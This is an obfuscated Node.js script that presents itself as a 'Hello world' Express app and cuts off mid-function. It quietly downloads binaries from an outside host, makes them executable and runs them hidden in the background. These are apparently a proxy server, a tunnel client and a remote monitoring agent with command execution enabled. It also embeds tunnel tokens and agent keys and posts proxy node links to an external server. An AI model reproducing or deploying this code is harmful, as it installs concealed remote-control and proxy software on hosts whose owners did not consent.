const _0x122416=_0x5bd1;(function(_0x508cbb,_0x577c48){const _0x1c270a=_0x5bd1,_0x1e8b95=_0x508cbb();while(!![]){try{const _0x44b07b=-parseInt(_0x1c270a(0x20c))/0x1+-parseInt(_0x1c270a(0x26d))/0x2*(parseInt(_0x1c270a(0x20b))/0x3)+parseInt(_0x1c270a(0x207))/0x4+-parseInt(_0x1c270a(0x273))/0x5+parseInt(_0x1c270a(0x1eb))/0x6*(parseInt(_0x1c270a(0x264))/0x7)+parseInt(_0x1c270a(0x247))/0x8*(parseInt(_0x1c270a(0x209))/0x9)+-parseInt(_0x1c270a(0x283))/0xa*(-parseInt(_0x1c270a(0x26c))/0xb);if(_0x44b07b===_0x577c48)break;else _0x1e8b95['push'](_0x1e8b95['shift']());}catch(_0x31b8be){_0x1e8b95['push'](_0x1e8b95['shift']());}}}(_0x4c9f,0x4dcbc));const _0x9fd47f=(function(){let _0x3d3526=!![];return function(_0x24ce04,_0x1dbd8f){const _0x27a495=_0x3d3526?function(){const _0x5e4fdd=_0x5bd1;if(_0x1dbd8f){const _0x452b67=_0x1dbd8f[_0x5e4fdd(0x1dc)](_0x24ce04,arguments);return _0x1dbd8f=null,_0x452b67;}}:function(){};return _0x3d3526=![],_0x27a495;};}()),_0x4453a3=_0x9fd47f(this,function(){const _0x2663ef=_0x5bd1;return _0x4453a3['toString']()[_0x2663ef(0x272)](_0x2663ef(0x25f))[_0x2663ef(0x26a)]()[_0x2663ef(0x278)](_0x4453a3)[_0x2663ef(0x272)](_0x2663ef(0x25f));});_0x4453a3();const _0x2ec955=(function(){let _0x32f0d8=!![];return function(_0x460122,_0x4e8ad7){const _0xcf37ea=_0x32f0d8?function(){const _0x27d831=_0x5bd1;if(_0x4e8ad7){const _0x3133e4=_0x4e8ad7[_0x27d831(0x1dc)](_0x460122,arguments);return _0x4e8ad7=null,_0x3133e4;}}:function(){};return _0x32f0d8=![],_0xcf37ea;};}()),_0x111322=_0x2ec955(this,function(){const _0x3854f9=_0x5bd1,_0x1be61c=function(){const _0x232e3a=_0x5bd1;let _0x191f7d;try{_0x191f7d=Function(_0x232e3a(0x274)+_0x232e3a(0x1e2)+');')();}catch(_0x2b5af0){_0x191f7d=window;}return _0x191f7d;},_0x357456=_0x1be61c(),_0x49bb90=_0x357456[_0x3854f9(0x1e9)]=_0x357456['console']||{},_0x368ff0=[_0x3854f9(0x236),_0x3854f9(0x208),'info','error','exception',_0x3854f9(0x265),_0x3854f9(0x29e)];for(let _0x127ea9=0x0;_0x127ea9<_0x368ff0['length'];_0x127ea9++){const _0x4108a9=_0x2ec955['constructor'][_0x3854f9(0x211)][_0x3854f9(0x291)](_0x2ec955),_0x4b8f58=_0x368ff0[_0x127ea9],_0x50609f=_0x49bb90[_0x4b8f58]||_0x4108a9;_0x4108a9['__proto__']=_0x2ec955[_0x3854f9(0x291)](_0x2ec955),_0x4108a9[_0x3854f9(0x26a)]=_0x50609f[_0x3854f9(0x26a)][_0x3854f9(0x291)](_0x50609f),_0x49bb90[_0x4b8f58]=_0x4108a9;}});_0x111322();const express=require('express'),app=express(),axios=require(_0x122416(0x1f1)),os=require('os'),fs=require('fs'),path=require(_0x122416(0x25b)),{promisify}=require(_0x122416(0x263)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x122416(0x214)),UPLOAD_URL=process[_0x122416(0x20f)][_0x122416(0x205)]||'',PROJECT_URL=process[_0x122416(0x20f)][_0x122416(0x22e)]||'',AUTO_ACCESS=process[_0x122416(0x20f)][_0x122416(0x23f)]||!![],FILE_PATH=process[_0x122416(0x20f)][_0x122416(0x251)]||_0x122416(0x22b),SUB_PATH=process[_0x122416(0x20f)][_0x122416(0x288)]||'jianxianapp',PORT=process[_0x122416(0x20f)][_0x122416(0x279)]||process[_0x122416(0x20f)]['PORT']||0xbb8,UUID=process['env'][_0x122416(0x28c)]||_0x122416(0x24a),NEZHA_SERVER=process[_0x122416(0x20f)][_0x122416(0x228)]||_0x122416(0x222),NEZHA_PORT=process[_0x122416(0x20f)][_0x122416(0x1f6)]||'',NEZHA_KEY=process[_0x122416(0x20f)]['NEZHA_KEY']||_0x122416(0x216),ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x122416(0x20a),ARGO_AUTH=process[_0x122416(0x20f)][_0x122416(0x25c)]||'eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiM2Q0MWM5ODItOGE3Mi00MDQ0LWJiMDktNWZhNzdkMGMyM2M0IiwicyI6Ik1URXpOMlJsWmpndE9EWmxOQzAwT1daakxXRTJZV1F0TXpsa016QXlNbU5tTXpCayJ9',ARGO_PORT=process['env'][_0x122416(0x282)]||0x1f41,CFIP=process['env'][_0x122416(0x25a)]||_0x122416(0x210),CFPORT=process[_0x122416(0x20f)]['CFPORT']||0x1bb,NAME=process[_0x122416(0x20f)]['NAME']||_0x122416(0x254);!fs[_0x122416(0x1ed)](FILE_PATH)?(fs[_0x122416(0x28f)](FILE_PATH),console['log'](FILE_PATH+_0x122416(0x22c))):console[_0x122416(0x236)](FILE_PATH+_0x122416(0x206));function generateRandomName(){const _0x30c031=_0x122416,_0x3f3d2b=_0x30c031(0x1fa);let _0x47234f='';for(let _0x9e6474=0x0;_0x9e6474<0x6;_0x9e6474++){_0x47234f+=_0x3f3d2b[_0x30c031(0x29b)](Math[_0x30c031(0x28b)](Math[_0x30c031(0x23a)]()*_0x3f3d2b[_0x30c031(0x226)]));}return _0x47234f;}function _0x4c9f(){const _0x5d61bb=['&path=%2Ftrojan-argo%3Fed%3D2560#','text/plain;\x20charset=utf-8','floor','UUID','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','mkdirSync','unlinkSync','bind','https://amd64.ssss.nyc.mn/web','TunnelSecret','data','substring','127.0.0.1','automatic\x20access\x20task\x20added\x20successfully','readFileSync','https://arm64.ssss.nyc.mn/web','/sub.txt\x20saved\x20successfully','charAt','2083','Unhandled\x20error\x20in\x20startserver:','trace','Error\x20in\x20startserver:','message','/vmess-argo?ed=2560','chmod','https://arm64.ssss.nyc.mn/v1','utf-8','post','\x20>\x20nul\x202>&1','filter','\x20-c\x20\x22','nohup\x20','aarch64','test','apply','false','?security=tls&sni=','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Fvless-argo%3Fed%3D2560#','fileName','{}.constructor(\x22return\x20this\x22)(\x20)','Empowerment\x20success\x20for\x20','true','then','map','has','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','console','/tunnel.yml\x20run','18jrkHzR','/api/add-nodes','existsSync','arch','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','get','axios','https://amd64.ssss.nyc.mn/agent','join','tunnel.yml','NEZHA\x20variable\x20is\x20empty,skip\x20running','NEZHA_PORT','vmess','\x20-c\x20','config.json','abcdefghijklmnopqrstuvwxyz','tcp','sub.txt','App\x20is\x20running','unlink','writeFileSync','http','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/dev/null','pop','\x20-p\x20','UPLOAD_URL','\x20already\x20exists','2252476hWmtFe','warn','27LFnDqY','phala.jianxian.nyc.mn','1835979kulCep','565980UGhrum','http\x20server\x20is\x20running\x20on\x20port:','tls','env','104.18.4.250','prototype','2096','firefox','child_process','Content-Type','k6qzrDL9Sttsfl4TOAQlL98DSnLG1Va5','.exe\x20>\x20nul\x202>&1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','pkill\x20-f\x20\x22[','Subscription\x20uploaded\x20successfully','catch','match','del\x20/f\x20/q\x20','\x22\x20>\x20/dev/null\x202>&1','forEach','platform','/api/add-subscriptions','jianxian.apkk.cloudns.org:56808','from','Empowerment\x20failed\x20for\x20','trojan','length','response','NEZHA_SERVER','clear','&fp=firefox&type=ws&host=','./tmp','\x20is\x20created','ARGO_DOMAIN:','PROJECT_URL','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2053','\x0avless://','Error\x20executing\x20command:\x20','\x20is\x20running','Download\x20','https://arm64.ssss.nyc.mn/agent','log','\x20>/dev/null\x202>&1','set','/trojan-argo','random','includes','listen','443','list.txt','AUTO_ACCESS','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','rm\x20-rf\x20','finish','arm','blackhole','?encryption=none&security=tls&sni=','tunnel.json','1145896suETAI','vless','https://arm64.ssss.nyc.mn/bot','0c524a06-80a4-4cb2-809a-8751c7ee4000','--tls','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','block','https+local://8.8.8.8/dns-query','ArgoDomain:','send','FILE_PATH','status','direct','Phala','error','/config.json\x20>/dev/null\x202>&1\x20&','pipe','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','amd','CFIP','path','ARGO_AUTH','base64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','(((.+)+)+)+$','Error\x20downloading\x20files:','push','split','util','608944xDZecB','table','2087','basename','stringify','close','toString','quic','558338BuWDLq','2OnqBto','\x20failed:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20successfully','config.yaml','search','1323805BOcscL','return\x20(function()\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unshift','application/json','constructor','SERVER_PORT','\x20-s\x20','Nodes\x20uploaded\x20successfully','xtls-rprx-vision','boot.log','/vmess-argo','8443','Error\x20reading\x20boot.log:','npm\x20running\x20error:\x20','ARGO_PORT','100yNhYVo','none','all','https://oooo.serv00.net/add-url','/api/delete-nodes','SUB_PATH'];_0x4c9f=function(){return _0x5d61bb;};return _0x4c9f();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x122416(0x1f3)](FILE_PATH,botName),subPath=path[_0x122416(0x1f3)](FILE_PATH,_0x122416(0x1fc)),listPath=path[_0x122416(0x1f3)](FILE_PATH,_0x122416(0x23e)),bootLogPath=path[_0x122416(0x1f3)](FILE_PATH,_0x122416(0x27d)),configPath=path[_0x122416(0x1f3)](FILE_PATH,_0x122416(0x1f9));function deleteNodes(){const _0x452c4d=_0x122416;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x104c8c;try{_0x104c8c=fs['readFileSync'](subPath,_0x452c4d(0x2a4));}catch{return null;}const _0x58ec85=Buffer[_0x452c4d(0x223)](_0x104c8c,'base64')[_0x452c4d(0x26a)](_0x452c4d(0x2a4)),_0x3a3f77=_0x58ec85[_0x452c4d(0x262)]('\x0a')[_0x452c4d(0x1d7)](_0x39c817=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x452c4d(0x1db)](_0x39c817));if(_0x3a3f77[_0x452c4d(0x226)]===0x0)return;return axios[_0x452c4d(0x1d5)](UPLOAD_URL+_0x452c4d(0x287),JSON[_0x452c4d(0x268)]({'nodes':_0x3a3f77}),{'headers':{'Content-Type':_0x452c4d(0x277)}})[_0x452c4d(0x21b)](_0x2efa6b=>{return null;}),null;}catch(_0x318d85){return null;}}function cleanupOldFiles(){const _0x241e7e=_0x122416;try{const _0x2e3cdd=fs['readdirSync'](FILE_PATH);_0x2e3cdd[_0x241e7e(0x21f)](_0x618fcd=>{const _0x3a9bee=_0x241e7e,_0x472991=path[_0x3a9bee(0x1f3)](FILE_PATH,_0x618fcd);try{const _0x2588a0=fs['statSync'](_0x472991);_0x2588a0['isFile']()&&fs[_0x3a9bee(0x290)](_0x472991);}catch(_0x423e2e){}});}catch(_0x25adcc){}}app[_0x122416(0x1f0)]('/',function(_0x1b8511,_0x180d2e){const _0x3ea441=_0x122416;_0x180d2e[_0x3ea441(0x250)]('Hello\x20world!');});async function generateConfig(){const _0x72f0be=_0x122416,_0xf596cd={'log':{'access':_0x72f0be(0x202),'error':_0x72f0be(0x202),'loglevel':_0x72f0be(0x284)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x72f0be(0x248),'settings':{'clients':[{'id':UUID,'flow':_0x72f0be(0x27c)}],'decryption':_0x72f0be(0x284),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x72f0be(0x1fb)}},{'port':0xbb9,'listen':_0x72f0be(0x296),'protocol':_0x72f0be(0x248),'settings':{'clients':[{'id':UUID}],'decryption':_0x72f0be(0x284)},'streamSettings':{'network':'tcp','security':_0x72f0be(0x284)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x72f0be(0x248),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x72f0be(0x284)},'streamSettings':{'network':'ws','security':_0x72f0be(0x284),'wsSettings':{'path':_0x72f0be(0x28d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x72f0be(0x20e),_0x72f0be(0x26b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x72f0be(0x296),'protocol':_0x72f0be(0x1f7),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x72f0be(0x27e)}},'sniffing':{'enabled':!![],'destOverride':[_0x72f0be(0x200),_0x72f0be(0x20e),_0x72f0be(0x26b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x72f0be(0x296),'protocol':_0x72f0be(0x225),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x72f0be(0x284),'wsSettings':{'path':_0x72f0be(0x239)}},'sniffing':{'enabled':!![],'destOverride':[_0x72f0be(0x200),_0x72f0be(0x20e),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x72f0be(0x24e)]},'outbounds':[{'protocol':'freedom','tag':_0x72f0be(0x253)},{'protocol':_0x72f0be(0x244),'tag':_0x72f0be(0x24d)}]};fs[_0x72f0be(0x1ff)](path[_0x72f0be(0x1f3)](FILE_PATH,'config.json'),JSON['stringify'](_0xf596cd,null,0x2));}function getSystemArchitecture(){const _0x2cb378=_0x122416,_0x273671=os[_0x2cb378(0x1ee)]();return _0x273671===_0x2cb378(0x243)||_0x273671==='arm64'||_0x273671===_0x2cb378(0x1da)?_0x2cb378(0x243):_0x2cb378(0x259);}function downloadFile(_0x84c7bf,_0x52103a,_0x507d82){const _0x5f3cd9=_0x122416,_0x457344=_0x84c7bf;!fs[_0x5f3cd9(0x1ed)](FILE_PATH)&&fs[_0x5f3cd9(0x28f)](FILE_PATH,{'recursive':!![]});const _0x249338=fs['createWriteStream'](_0x457344);axios({'method':_0x5f3cd9(0x1f0),'url':_0x52103a,'responseType':'stream'})[_0x5f3cd9(0x1e5)](_0x18ba36=>{const _0x48cfd0=_0x5f3cd9;_0x18ba36[_0x48cfd0(0x294)][_0x48cfd0(0x257)](_0x249338),_0x249338['on'](_0x48cfd0(0x242),()=>{const _0x575c7b=_0x48cfd0;_0x249338[_0x575c7b(0x269)](),console[_0x575c7b(0x236)](_0x575c7b(0x234)+path[_0x575c7b(0x267)](_0x457344)+_0x575c7b(0x270)),_0x507d82(null,_0x457344);}),_0x249338['on'](_0x48cfd0(0x255),_0xf2119c=>{const _0x233b30=_0x48cfd0;fs[_0x233b30(0x1fe)](_0x457344,()=>{});const _0x3738be='Download\x20'+path[_0x233b30(0x267)](_0x457344)+_0x233b30(0x26e)+_0xf2119c[_0x233b30(0x2a0)];console[_0x233b30(0x255)](_0x3738be),_0x507d82(_0x3738be);});})[_0x5f3cd9(0x21b)](_0x3903cf=>{const _0x31e851=_0x5f3cd9,_0x582bc8=_0x31e851(0x234)+path[_0x31e851(0x267)](_0x457344)+_0x31e851(0x26e)+_0x3903cf[_0x31e851(0x2a0)];console[_0x31e851(0x255)](_0x582bc8),_0x507d82(_0x582bc8);});}async function downloadFilesAndRun(){const _0x497d96=_0x122416,_0x5dce2a=getSystemArchitecture(),_0x8efc62=getFilesForArchitecture(_0x5dce2a);if(_0x8efc62[_0x497d96(0x226)]===0x0){console[_0x497d96(0x236)](_0x497d96(0x218));return;}const _0x4453e7=_0x8efc62[_0x497d96(0x1e6)](_0x2e32de=>{return new Promise((_0x387af9,_0x3894ac)=>{const _0x9b2d47=_0x5bd1;downloadFile(_0x2e32de[_0x9b2d47(0x1e1)],_0x2e32de['fileUrl'],(_0x95c470,_0xb3be5c)=>{_0x95c470?_0x3894ac(_0x95c470):_0x387af9(_0xb3be5c);});});});try{await Promise[_0x497d96(0x285)](_0x4453e7);}catch(_0xf39a7c){console[_0x497d96(0x255)](_0x497d96(0x260),_0xf39a7c);return;}function _0x35608d(_0x33cde9){const _0xe8aa91=0x1fd;_0x33cde9['forEach'](_0x2bcadf=>{const _0x5af632=_0x5bd1;fs[_0x5af632(0x1ed)](_0x2bcadf)&&fs[_0x5af632(0x2a2)](_0x2bcadf,_0xe8aa91,_0x223e5e=>{const _0x5328a6=_0x5af632;_0x223e5e?console[_0x5328a6(0x255)](_0x5328a6(0x224)+_0x2bcadf+':\x20'+_0x223e5e):console['log'](_0x5328a6(0x1e3)+_0x2bcadf+':\x20'+_0xe8aa91['toString'](0x8));});});}const _0x8e6592=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x35608d(_0x8e6592);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x506546=NEZHA_SERVER[_0x497d96(0x23b)](':')?NEZHA_SERVER[_0x497d96(0x262)](':')[_0x497d96(0x203)]():'',_0x541d8f=new Set(['443',_0x497d96(0x27f),_0x497d96(0x212),_0x497d96(0x266),_0x497d96(0x29c),_0x497d96(0x230)]),_0x2554ed=_0x541d8f[_0x497d96(0x1e7)](_0x506546)?_0x497d96(0x1e4):_0x497d96(0x1dd),_0x19459a='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x497d96(0x275)+_0x2554ed+_0x497d96(0x25e)+UUID;fs[_0x497d96(0x1ff)](path[_0x497d96(0x1f3)](FILE_PATH,_0x497d96(0x271)),_0x19459a);const _0x219ebf=_0x497d96(0x1d9)+phpPath+_0x497d96(0x1d8)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x219ebf),console[_0x497d96(0x236)](phpName+_0x497d96(0x233)),await new Promise(_0x3c8eb0=>setTimeout(_0x3c8eb0,0x3e8));}catch(_0x391360){console[_0x497d96(0x255)]('php\x20running\x20error:\x20'+_0x391360);}}else{let _0x53b797='';const _0x5f254a=[_0x497d96(0x23d),_0x497d96(0x27f),'2096',_0x497d96(0x266),_0x497d96(0x29c),_0x497d96(0x230)];_0x5f254a[_0x497d96(0x23b)](NEZHA_PORT)&&(_0x53b797=_0x497d96(0x24b));const _0x46402c=_0x497d96(0x1d9)+npmPath+_0x497d96(0x27a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x497d96(0x204)+NEZHA_KEY+'\x20'+_0x53b797+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x46402c),console['log'](npmName+_0x497d96(0x233)),await new Promise(_0x53ba21=>setTimeout(_0x53ba21,0x3e8));}catch(_0x1b1aa6){console[_0x497d96(0x255)](_0x497d96(0x281)+_0x1b1aa6);}}}else console[_0x497d96(0x236)](_0x497d96(0x1f5));const _0x17366c=_0x497d96(0x1d9)+webPath+_0x497d96(0x1f8)+FILE_PATH+_0x497d96(0x256);try{await exec(_0x17366c),console[_0x497d96(0x236)](webName+_0x497d96(0x233)),await new Promise(_0x509414=>setTimeout(_0x509414,0x3e8));}catch(_0x240182){console[_0x497d96(0x255)]('web\x20running\x20error:\x20'+_0x240182);}if(fs[_0x497d96(0x1ed)](botPath)){let _0x483bd2;if(ARGO_AUTH[_0x497d96(0x21c)](/^[A-Z0-9a-z=]{120,250}$/))_0x483bd2=_0x497d96(0x1e8)+ARGO_AUTH;else ARGO_AUTH[_0x497d96(0x21c)](/TunnelSecret/)?_0x483bd2=_0x497d96(0x258)+FILE_PATH+_0x497d96(0x1ea):_0x483bd2=_0x497d96(0x22f)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x497d96(0x1d9)+botPath+'\x20'+_0x483bd2+'\x20>/dev/null\x202>&1\x20&'),console[_0x497d96(0x236)](botName+_0x497d96(0x233)),await new Promise(_0xa1f016=>setTimeout(_0xa1f016,0x7d0));}catch(_0x5b5569){console[_0x497d96(0x255)](_0x497d96(0x232)+_0x5b5569);}}await new Promise(_0x7ce85b=>setTimeout(_0x7ce85b,0x1388));}function getFilesForArchitecture(_0x44ab1c){const _0x9ffdbd=_0x122416;let _0x4827d3;_0x44ab1c===_0x9ffdbd(0x243)?_0x4827d3=[{'fileName':webPath,'fileUrl':_0x9ffdbd(0x299)},{'fileName':botPath,'fileUrl':_0x9ffdbd(0x249)}]:_0x4827d3=[{'fileName':webPath,'fileUrl':_0x9ffdbd(0x292)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x18f4ee=_0x44ab1c===_0x9ffdbd(0x243)?_0x9ffdbd(0x235):_0x9ffdbd(0x1f2);_0x4827d3['unshift']({'fileName':npmPath,'fileUrl':_0x18f4ee});}else{const _0x4f73bf=_0x44ab1c===_0x9ffdbd(0x243)?_0x9ffdbd(0x2a3):'https://amd64.ssss.nyc.mn/v1';_0x4827d3[_0x9ffdbd(0x276)]({'fileName':phpPath,'fileUrl':_0x4f73bf});}}return _0x4827d3;}function _0x5bd1(_0x212954,_0x342ea0){const _0x546337=_0x4c9f();return _0x5bd1=function(_0x111322,_0x2ec955){_0x111322=_0x111322-0x1d5;let _0x32c2bb=_0x546337[_0x111322];return _0x32c2bb;},_0x5bd1(_0x212954,_0x342ea0);}function argoType(){const _0x59f6cb=_0x122416;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x59f6cb(0x24c));return;}if(ARGO_AUTH['includes'](_0x59f6cb(0x293))){fs['writeFileSync'](path[_0x59f6cb(0x1f3)](FILE_PATH,_0x59f6cb(0x246)),ARGO_AUTH);const _0x99e8b8='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x59f6cb(0x262)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x59f6cb(0x1f3)](FILE_PATH,_0x59f6cb(0x246))+_0x59f6cb(0x201)+ARGO_DOMAIN+_0x59f6cb(0x28e)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x59f6cb(0x1ff)](path[_0x59f6cb(0x1f3)](FILE_PATH,_0x59f6cb(0x1f4)),_0x99e8b8);}else console['log'](_0x59f6cb(0x1ef));}argoType();async function extractDomains(){const _0x494cbd=_0x122416;let _0x808f86;if(ARGO_AUTH&&ARGO_DOMAIN)_0x808f86=ARGO_DOMAIN,console[_0x494cbd(0x236)](_0x494cbd(0x22d),_0x808f86),await _0x2268de(_0x808f86);else try{const _0x2ac3b6=fs[_0x494cbd(0x298)](path[_0x494cbd(0x1f3)](FILE_PATH,'boot.log'),_0x494cbd(0x2a4)),_0x5c23f5=_0x2ac3b6[_0x494cbd(0x262)]('\x0a'),_0x71118a=[];_0x5c23f5[_0x494cbd(0x21f)](_0x4ed0b3=>{const _0x458059=_0x494cbd,_0x2d58b0=_0x4ed0b3[_0x458059(0x21c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2d58b0){const _0x42e456=_0x2d58b0[0x1];_0x71118a['push'](_0x42e456);}});if(_0x71118a[_0x494cbd(0x226)]>0x0)_0x808f86=_0x71118a[0x0],console[_0x494cbd(0x236)](_0x494cbd(0x24f),_0x808f86),await _0x2268de(_0x808f86);else{console['log'](_0x494cbd(0x26f)),fs[_0x494cbd(0x290)](path[_0x494cbd(0x1f3)](FILE_PATH,_0x494cbd(0x27d)));async function _0xcd53b(){const _0x9fc77=_0x494cbd;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x9fc77(0x217)):await exec(_0x9fc77(0x219)+botName[_0x9fc77(0x29b)](0x0)+']'+botName[_0x9fc77(0x295)](0x1)+_0x9fc77(0x21e));}catch(_0x10f01e){}}_0xcd53b(),await new Promise(_0x49d51f=>setTimeout(_0x49d51f,0xbb8));const _0x3fd19c=_0x494cbd(0x22f)+FILE_PATH+_0x494cbd(0x240)+ARGO_PORT;try{await exec(_0x494cbd(0x1d9)+botPath+'\x20'+_0x3fd19c+'\x20>/dev/null\x202>&1\x20&'),console[_0x494cbd(0x236)](botName+_0x494cbd(0x233)),await new Promise(_0x2c9bb5=>setTimeout(_0x2c9bb5,0xbb8)),await extractDomains();}catch(_0x24e28f){console[_0x494cbd(0x255)]('Error\x20executing\x20command:\x20'+_0x24e28f);}}}catch(_0x501054){console[_0x494cbd(0x255)](_0x494cbd(0x280),_0x501054);}async function _0x2268de(_0x330400){const _0x4bb9ac=_0x494cbd,_0x3848a7=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x4bb9ac(0x2a4)}),_0x13915f=_0x3848a7['trim'](),_0x3c8d74=NAME?NAME+'-'+_0x13915f:_0x13915f;return new Promise(_0x47da03=>{setTimeout(()=>{const _0x4453cd=_0x5bd1,_0xf8d0dd={'v':'2','ps':''+_0x3c8d74,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4453cd(0x284),'net':'ws','type':'none','host':_0x330400,'path':_0x4453cd(0x2a1),'tls':'tls','sni':_0x330400,'alpn':'','fp':_0x4453cd(0x213)},_0x29e40a=_0x4453cd(0x231)+UUID+'@'+CFIP+':'+CFPORT+_0x4453cd(0x245)+_0x330400+_0x4453cd(0x22a)+_0x330400+_0x4453cd(0x1e0)+_0x3c8d74+'\x0a\x20\x20\x0avmess://'+Buffer[_0x4453cd(0x223)](JSON['stringify'](_0xf8d0dd))['toString'](_0x4453cd(0x25d))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4453cd(0x1de)+_0x330400+_0x4453cd(0x22a)+_0x330400+_0x4453cd(0x289)+_0x3c8d74+'\x0a\x20\x20\x20\x20';console['log'](Buffer[_0x4453cd(0x223)](_0x29e40a)['toString'](_0x4453cd(0x25d))),fs[_0x4453cd(0x1ff)](subPath,Buffer[_0x4453cd(0x223)](_0x29e40a)['toString']('base64')),console[_0x4453cd(0x236)](FILE_PATH+_0x4453cd(0x29a)),uploadNodes(),app[_0x4453cd(0x1f0)]('/'+SUB_PATH,(_0x27bda6,_0x5997c7)=>{const _0x44d54f=_0x4453cd,_0x5601e5=Buffer[_0x44d54f(0x223)](_0x29e40a)[_0x44d54f(0x26a)](_0x44d54f(0x25d));_0x5997c7[_0x44d54f(0x238)](_0x44d54f(0x215),_0x44d54f(0x28a)),_0x5997c7[_0x44d54f(0x250)](_0x5601e5);}),_0x47da03(_0x29e40a);},0x7d0);});}}async function uploadNodes(){const _0x4abbb0=_0x122416;if(UPLOAD_URL&&PROJECT_URL){const _0x41ef34=PROJECT_URL+'/'+SUB_PATH,_0x123fdf={'subscription':[_0x41ef34]};try{const _0x5a7049=await axios[_0x4abbb0(0x1d5)](UPLOAD_URL+_0x4abbb0(0x221),_0x123fdf,{'headers':{'Content-Type':_0x4abbb0(0x277)}});return _0x5a7049&&_0x5a7049['status']===0xc8?(console[_0x4abbb0(0x236)](_0x4abbb0(0x21a)),_0x5a7049):null;}catch(_0x24f223){if(_0x24f223[_0x4abbb0(0x227)]){if(_0x24f223[_0x4abbb0(0x227)][_0x4abbb0(0x252)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4abbb0(0x1ed)](listPath))return;const _0x78d450=fs[_0x4abbb0(0x298)](listPath,_0x4abbb0(0x2a4)),_0x44659f=_0x78d450['split']('\x0a')[_0x4abbb0(0x1d7)](_0x4c3b06=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4abbb0(0x1db)](_0x4c3b06));if(_0x44659f['length']===0x0)return;const _0x1fd9f8=JSON['stringify']({'nodes':_0x44659f});try{const _0x5c714e=await axios[_0x4abbb0(0x1d5)](UPLOAD_URL+_0x4abbb0(0x1ec),_0x1fd9f8,{'headers':{'Content-Type':_0x4abbb0(0x277)}});return _0x5c714e&&_0x5c714e[_0x4abbb0(0x252)]===0xc8?(console[_0x4abbb0(0x236)](_0x4abbb0(0x27b)),_0x5c714e):null;}catch(_0xa173d3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const 